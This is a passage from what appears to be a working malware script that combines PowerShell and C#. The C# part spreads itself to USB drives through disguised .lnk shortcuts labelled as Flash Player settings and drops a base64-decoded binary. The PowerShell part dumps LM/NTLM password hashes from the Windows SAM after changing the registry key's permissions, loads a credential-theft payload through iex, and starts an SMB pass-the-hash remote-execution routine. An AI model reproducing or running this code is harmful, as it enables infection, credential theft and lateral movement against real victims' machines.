            byte[] gb_bytes = Convert.FromBase64String(gb);

            fs1.Write(gb_bytes,0,gb_bytes.Length);

            fs1.Close();

            Console.WriteLine(gb_bytes.Length);

            return true;

        }

        static bool CreateLnk(string drive, string binfname, string gb)

        {

            byte[] bytes1 = new byte[]{0x4c,0x00,0x00,0x00,0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x00,0x14,0x00,0x1f,0x80,0x20,0x20,0xec,0x21,0xea,0x3a,0x69,0x10,0xa2,0xdd,0x08,0x00,0x2b,0x30,0x30,0x9d,0x86,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6a,0x00,0x00,0x00,0x00,0x00,0x00};

            byte[] bytes2 = new byte[]{0x3a,0x00,0x5c};

            byte[] bytes3 = new byte[]{0x00,0x00,0x00,0x46,0x00,0x6c,0x00,0x61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x00,0x00,0x4d,0x00,0x61,0x00,0x6e,0x00,0x61,0x00,0x67,0x00,0x65,0x00,0x20,0x00,0x46,0x00,0x6c,0x00,0x61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x20,0x00,0x53,0x00,0x65,0x00,0x74,0x00,0x74,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x05,0x00,0x00,0xa0,0x03,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

            for(char i = 'D'; i <= 'K'; i++)

            {

                FileStream fs = new FileStream(drive+i.ToString()+binfname.Replace(".bin",".lnk"), FileMode.Create);

                fs.Write(bytes1,0,bytes1.Length);

                byte[] d = new byte[4]; 

                int l = binfname.Length+4;

                d[0] = (byte) (l & 0xFF); 

                d[1] = (byte) ((l & 0xFF00) >> 8); 

                d[2] = 0x0d; 

                d[3] = 0x00;

                fs.Write(d,0,d.Length);

                byte[] b = new byte[2]; 

                b[0] = (byte) (i & 0xFF); 

                b[1] = (byte) ((i & 0xFF00) >> 8); 

                fs.Write(b,0,b.Length);

                fs.Write(bytes2,0,bytes2.Length);

                foreach(char c in binfname){

                    byte[] bb = new byte[2]; 

                    bb[0] = (byte) ((c & 0xFF00) >> 8); 

                    bb[1] = (byte) (c & 0xFF); 

                    fs.Write(bb,0,bb.Length);

                }

                fs.Write(bytes3,0,bytes3.Length);

                fs.Close();

            }

            FileStream fs1 = new FileStream(drive+binfname, FileMode.Create);

            byte[] gb_bytes = Convert.FromBase64String(gb);

            fs1.Write(gb_bytes,0,gb_bytes.Length);

            fs1.Close();

            Console.WriteLine(gb_bytes.Length);

            return true;

        }

        static void BaseMode()

        {

            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)

            {

                if (blacklist.Contains(drive.Name))

                {    continue;}

                Console.WriteLine("Detect drive:"+drive.Name);

                if (IsSupported(drive))

                {

                    if (!File.Exists(drive + home + inf_data))

                    {

                        Console.WriteLine("Try to infect "+drive.Name);

                        if (CreateHomeDirectory(drive.Name) && Infect(drive.Name))

                        {

                            blacklist.Add(drive.Name);

                        }

                    }

                    else {

                        Console.WriteLine(drive.Name+" already infected!");

                        blacklist.Add(drive.Name);

                    }

                }

                else{

                    blacklist.Add(drive.Name);

                }

            }

        }

    }

}

"@

Start-Job -ScriptBlock { aDd-TYpe -TypeDefinition $($args[0]);[USB.USBLNK]::Main1($($args[1]),$($args[2]),$($args[3])) } -ArgumentList $source2,$blue3_bin_b64,$blue6_bin_b64,$jsb64

function geth {  

[CmdletBinding()]

Param (

    [Switch]$PSObjectFormat

)

$script:PowerDump = $null

function LoadApi

{

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')

    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    $PInvokeMethod = $TypeBuilder.DefineMethod(

        'RegOpenKeyEx',

        [Reflection.MethodAttributes] 'Public, Static',

        [int],

        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())

    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),

        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')

    )

    $FieldValueArray = [Object[]] @(

        'RegOpenKeyEx',

        [Runtime.InteropServices.CharSet]::Auto

    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        $DllImportConstructor,

        @('advapi32.dll'),

        $FieldArray,

        $FieldValueArray

    )

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $PInvokeMethod = $TypeBuilder.DefineMethod(

        'RegQueryInfoKey',

        [Reflection.MethodAttributes] 'Public, Static',

        [int],

        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])

    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),

        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),

        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')

    )

    $FieldValueArray = [Object[]] @(

        'RegQueryInfoKey',

        [Runtime.InteropServices.CallingConvention]::Winapi,

        $true

    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        $DllImportConstructor,

        @('advapi32.dll'),

        $FieldArray,

        $FieldValueArray

    )

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $PInvokeMethod = $TypeBuilder.DefineMethod(

        'RegCloseKey',

        [Reflection.MethodAttributes] 'Public, Static',

        [int],

        [Type[]] @( [int])

    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),

        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')

    )

    $FieldValueArray = [Object[]] @(

        'RegCloseKey',

        $true

    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        $DllImportConstructor,

        @('advapi32.dll'),

        $FieldArray,

        $FieldValueArray

    )

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    ################################################################################

    $script:PowerDump = $TypeBuilder.CreateType()

}

#######################################powerdump written by David Kennedy#########################################

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");

$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");

$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);

$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);

$odd_parity = @(

  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,

  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,

  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,

  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,

  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,

  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,

  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,

  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,

  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,

  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,

  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,

  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,

  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,

  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,

  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,

  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254

);

function sid_to_key($sid)

{

    $c0 = $sid -band 255

    $c1 = ($sid -band 65280)/256

    $c2 = ($sid -band 16711680)/65536

    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)

    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))

}

function str_to_key($s)

{

    $k0 = [int][math]::Floor($s[0] * 0.5)

    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)

    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)

    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)

    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)

    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)

    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)

    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | %{

        $key[$_] = $odd_parity[($key[$_] * 2)]

    }

    return ,$key

}

function NewRC4([byte[]]$key)

{

    return new-object Object |

    Add-Member NoteProperty key $key -PassThru |

    Add-Member NoteProperty S $null -PassThru |

    Add-Member ScriptMethod init {

        if (-not $this.S)

        {

            [byte[]]$this.S = 0..255;

            0..255 | % -begin{[long]$j=0;}{

                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;

                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;

                }

        }

    } -PassThru |

    Add-Member ScriptMethod "encrypt" {

        $data = $args[0];

        $this.init();

        $outbuf = new-object byte[] $($data.Length);

        $S2 = $this.S[0..$this.S.Length];

        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {

            $i = ($i+1) % $S2.Length;

            $j = ($j + $S2[$i]) % $S2.Length;

            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;

            $a = $data[$_];

            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];

            $outbuf[$_] = ($a -bxor $b);

        }

        return ,$outbuf;

    } -PassThru

}

function des_encrypt([byte[]]$data, [byte[]]$key)

{

    return ,(des_transform $data $key $true)

}

function des_decrypt([byte[]]$data, [byte[]]$key)

{

    return ,(des_transform $data $key $false)

}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)

{

    $des = new-object Security.Cryptography.DESCryptoServiceProvider;

    $des.Mode = [Security.Cryptography.CipherMode]::ECB;

    $des.Padding = [Security.Cryptography.PaddingMode]::None;

    $des.Key = $key;

    $des.IV = $key;

    $transform = $null;

    if ($doEncrypt) {$transform = $des.CreateEncryptor();}

    else{$transform = $des.CreateDecryptor();}

    $result = $transform.TransformFinalBlock($data, 0, $data.Length);

    return ,$result;

}

function Get-RegKeyClass([string]$key, [string]$subkey)

{

    switch ($Key) {

        "HKCR" { $nKey = 0x80000000} #HK Classes Root

        "HKCU" { $nKey = 0x80000001} #HK Current User

        "HKLM" { $nKey = 0x80000002} #HK Local Machine

        "HKU"  { $nKey = 0x80000003} #HK Users

        "HKCC" { $nKey = 0x80000005} #HK Current Config

        default {

            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"

        }

    }

    $KEYQUERYVALUE = 0x1;

    $KEYREAD = 0x19;

    $KEYALLACCESS = 0x3F;

    $result = "";

    [int]$hkey=0

    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))

    {

        $classVal = New-Object Text.Stringbuilder 1024

        [int]$len = 1024

        if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,

            [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))

        {

            $result = $classVal.ToString()

        }

        else

        {

            Write-Error "RegQueryInfoKey failed";

        }

        $script:PowerDump::RegCloseKey($hkey) | Out-Null

    }

    else

    {

        Write-Error "Cannot open key";

    }

    return $result;

}

function Get-BootKey

{

    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));

    $b = new-object byte[] $($s.Length/2);

    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}

    $b2 = new-object byte[] 16;

    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}

    return ,$b2;

}

function Get-HBootKey

{

    param([byte[]]$bootkey);

    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");

    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");

    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;

    if (-not $k) {return $null}

    [byte[]]$F = $k.GetValue("F");

    if (-not $F) {return $null}

    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);

    $rc4 = NewRC4 $rc4key;

    return ,($rc4.encrypt($F[0x80..0x9F]));

}

function Get-UserName([byte[]]$V)

{

    if (-not $V) {return $null};

    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;

    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);

    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);

}

function Get-UserHashes($u, [byte[]]$hbootkey)

{

    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;

    # check if hashes exist (if byte memory equals to 20, then we've got a hash)

    $LM_exists = $false;

    $NT_exists = $false;

    # LM header check

    if ($u.V[0xa0..0xa3] -eq 20)

    {

        $LM_exists = $true;

    }

    # NT header check

    elseif ($u.V[0xac..0xaf] -eq 20)

    {

        $NT_exists = $true;

    }

    if ($LM_exists -eq $true)

    {

        $lm_hash_offset = $u.HashOffset + 4;

        $nt_hash_offset = $u.HashOffset + 8 + 0x10;

        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];

        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];

    }

    elseif ($NT_exists -eq $true)

    {

        $nt_hash_offset = $u.HashOffset + 8;

        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];

    }

    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);

}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)

{

    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;

    if ($enc_lm_hash)

    {

        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;

    }

    if ($enc_nt_hash)

    {

        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;

    }

    return ,($lmhash,$nthash)

}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)

{

    $deskeys = sid_to_key $rid;

    $md5 = [Security.Cryptography.MD5]::Create();

    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);

    $rc4 = NewRC4 $rc4_key;

    $obfkey = $rc4.encrypt($enc_hash);

    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +

        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);

    return ,$hash;

}

function Get-UserKeys

{

    ls HKLM:\SAM\SAM\Domains\Account\Users |

        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |

            Add-Member AliasProperty KeyName PSChildName -PassThru |

            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |

            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |

            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |

            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru

}

function DumpHashes

{

    LoadApi

    $bootkey = Get-BootKey;

    $hbootKey = Get-HBootKey $bootkey;

    Get-UserKeys | %{

        $hashes = Get-UserHashes $_ $hBootKey;

        if($PSObjectFormat)

        {

            $creds = New-Object psobject

            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username

            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid

            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()

            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()

            $creds

        }

        else

        {

            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,

            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),

            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());

        }

    }

}

    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))

    {

        Return

    } 

    else

    {

        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (

        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,

        "FullControl",

        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",

        [System.Security.AccessControl.PropagationFlags]"None",

        [System.Security.AccessControl.AccessControlType]"Allow")

        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(

        "SAM\SAM\Domains",

        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,

        [System.Security.AccessControl.RegistryRights]::ChangePermissions)

        $acl = $key.GetAccessControl()

        $acl.SetAccessRule($rule)

        $key.SetAccessControl($acl)

        DumpHashes

        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null

        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }

}

function Invoke-Mypass {

    iex(-join[char[]][System.IO.File]::ReadAllBytes($mimipath))

    invoke-Udyeijdyqid

}

function Invoke-SE

{

[CmdletBinding(DefaultParametersetName='Default')]

param

(

    [parameter(Mandatory=$false)][String]$Target,

    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,

    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,

    [parameter(Mandatory=$false)][String]$Command,

    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",

    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,

    [parameter(Mandatory=$false)][String]$Service,

    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",

    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,

    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,

    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,

    [parameter(Mandatory=$false)][Int]$Sleep=150

)

if($PsCmdlet.ParameterSetName -ne 'Session' -and !$Target)

{

    Write-Output "[-] Target is required when not using -Session"

    throw

}

if($Command)

{

    $SMB_execute = $true

}

if($Version -eq '1')

{

    $SMB_version = 'SMB1'

}

elseif($Version -eq '2.1')

{

    $SMB_version = 'SMB2.1'

}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')

{

    $signing_check = $true

}

function ConvertFrom-PacketOrderedDictionary

{

    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)

    {

        $byte_array += $field

    }

    return $byte_array

}

#NetBIOS

function New-PacketNetBIOSSessionService

{

    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary

    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))

    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService

}

#SMB1

function New-PacketSMBHeader

{

    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))

    $SMBHeader.Add("Command",$Command)

    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))

    $SMBHeader.Add("Reserved",[Byte[]](0x00))

    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))

    $SMBHeader.Add("Flags",$Flags)

    $SMBHeader.Add("Flags2",$Flags2)

    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))

    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))

    $SMBHeader.Add("TreeID",$TreeID)

    $SMBHeader.Add("ProcessID",$ProcessID)

    $SMBHeader.Add("UserID",$UserID)

    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader

}

function New-PacketSMBNegotiateProtocolRequest

{

    param([String]$Version)

    if($Version -eq 'SMB1')

    {

        [Byte[]]$byte_count = 0x0c,0x00

    }

    else

    {

        [Byte[]]$byte_count = 0x22,0x00  

    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))

    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)

    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))

    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')

    {

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))

    }

    return $SMBNegotiateProtocolRequest

}

function New-PacketSMBSessionSetupAndXRequest

{

    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]

    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))

    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))

    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))

    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))

    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)

    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))

    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)

    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)

    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 

}

function New-PacketSMBTreeConnectAndXRequest

{

    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))

    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))

    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))

    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)

    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))

    $SMBTreeConnectAndXRequest.Add("Tree",$Path)

    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest

}

function New-PacketSMBNTCreateAndXRequest

{

    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))

    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))

    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)

    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))

    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))

    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)

    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest

}

function New-PacketSMBReadAndXRequest

{

    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))

    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))

